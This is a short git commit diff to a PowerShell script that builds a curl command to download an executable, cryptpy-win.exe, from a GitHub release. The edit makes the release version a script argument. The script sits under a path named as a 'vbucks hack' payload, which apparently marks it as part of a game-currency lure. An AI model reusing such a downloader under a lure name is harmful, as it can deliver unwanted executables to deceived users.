6486a78dac66b7a0d85eaa07e8960e2586f0c404
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-30 11:10:27 -0400

    Updated version arg.

--- payload/vbucks/src/hack/js/window-three-sources/installcryptpy.ps1
+++ payload/vbucks/src/hack/js/window-three-sources/installcryptpy.ps1
@@ -1,4 +1,4 @@
-$version = "1.3.5" # Fetch version argument
+$version = $args[0] # Fetch version argument
 
 $downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-win.exe" # Fetch latest build URL
 $downloadCommand = 'curl -S -L '+$downloadUrl+' --output cryptpy-win.exe' # Set into command
